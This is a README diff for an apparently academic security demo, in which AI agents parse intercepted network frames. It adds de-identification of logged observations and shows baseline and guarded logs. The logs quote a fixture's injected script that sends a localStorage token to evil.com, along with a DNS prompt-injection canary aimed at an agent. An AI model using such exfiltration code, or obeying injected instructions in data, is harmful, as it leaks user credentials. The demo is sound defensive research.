@@ -20,6 +20,7 @@ This demo simulates:
 - Named detection rules over the wire data (credential-, command-, injection-shaped content)
 - An ephemeral buffer that bounds size and lifetime and zeros its own copy on release
 - An action guard that blocks tainted or intercepted values from sensitive operations
+- A de-identification pass over each recorded observation: stable pseudonyms for identities, `[REDACTED]` for secrets, so the guarded agent's log holds no name or token in the clear
 
 ## Safety Notice
 
@@ -37,7 +38,7 @@ This demo simulates:
 | Commit | Git SHA (written by the generator; `local` outside a checkout) |
 | Python | 3.11+ |
 | Command | `make demo DEMO=09` |
-| Tests | 39 (`python3 -m pytest tests/ -v`) |
+| Tests | 44 (`python3 -m pytest tests/ -v`) |
 
 ## Conference Paper Alignment (Paper 9: ESORICS)
 
@@ -65,6 +66,34 @@ The baseline agent uses the same parser and detectors but no scope, no taint, an
 2. **Ephemeral buffers**: field values live in a bounded, expiring buffer whose own byte copy is zeroed on delete, expiry, eviction, and at the end of every frame. Zeroing cannot reach other copies — hence the guard, and Exercise 9.5.
 3. **Privileged action confinement**: `store_credential` and `system_shutdown` have ceiling `LOW` *and* refuse `intercepted_network` provenance regardless of label (`intercepted_network_cannot_drive_privileged_action`). `update_dns_cache` tolerates `MEDIUM`; `record_observation` tolerates `HIGH`.
 4. **Detection is not an answer key**: the fixture's `injection`/`expected` fields are read only by the tests and the results generator; stripping them does not change a single verdict (`test_detection_does_not_read_the_annotation`).
+5. **De-identify what is kept**: the guarded agent records a compact note per in-scope frame, but de-identifies it first — identities become stable pseudonyms, secrets are redacted — so an allowed observation never puts a name or a token in the log in the clear. The baseline logs the same notes raw.
+
+### Observation Log: De-identify What You Keep
+
+Even the one thing the guarded agent is *allowed* to retain — a compact note per in-scope frame — is de-identified before it is written down. Between scope and taint (`scope → observe/de-identify → taint → guard`), each note runs through `shared/anonymize.py` (`Anonymizer.deidentify`): source IPs and usernames become stable pseudonyms, the synthetic `contact` e-mail (added to frame_001 and frame_007) becomes a pseudonym, and tokens and passwords are redacted to `[REDACTED]`. Pseudonyms are stable across frames — the same account keeps the same tag, so records still join — and locally reversible via `agent.anon.reverse(tag)`; the map never leaves the machine. The baseline records the same notes in the clear. frame_007 is out of scope, so the guarded agent never observes it, while the baseline logs its user and forged token anyway.
+
+```
+--- Observation log: what each agent writes down ---
+  Baseline (recorded in the clear):
+    http 192.168.1.10:80 {"user": "alice", "contact": "alice@corp.example", "role": "admin", "token"
+    http 192.168.1.10:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token='+localStor
+    dns 192.168.1.1:53 api.internal.example -> 10.0.0.50,CANARY_DNS_INJECTION_IGNORE_RULES
+    tls 192.168.1.20:443 CN=api.internal.example
+    custom 192.168.1.30:9999 DATA_CHUNK_1
+    http 192.168.1.10:80 {"error": "unauthorized"}
+    http 10.0.0.99:80 {"user": "alice", "contact": "alice@corp.example", "token": "DEMO_TOKEN_FORGED
+    local 127.0.0.1 {"service": "api.internal.example", "token": "DEMO_LOCAL_TOKEN_XYZ789"}
+  Guarded (de-identified before recording):
+    http HOST_0272:80 {"user": "USER_5aff", "contact": "EMAIL_e50e", "role": "admin", "token": "[RED
+    http HOST_0272:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token=[REDACTED]
+    dns HOST_239e:53 api.internal.example -> HOST_b6d0,CANARY_DNS_INJECTION_IGNORE_RULES
+    tls HOST_ec1a:443 CN=api.internal.example
+    custom HOST_ff75:9999 DATA_CHUNK_1
+    http HOST_0272:80 {"error": "unauthorized"}
+    local HOST_f63c {"service": "api.internal.example", "token": "[REDACTED]"}
+  De-identified before recording: 1 username, 1 email, 8 IPs, 3 secrets; 0 identities or secrets written in the clear
+  (frame_007 is out of scope, so the guarded agent never records it - the baseline logs its user and token anyway)
+```
 
 ## Difference from Private Research Benchmark
 
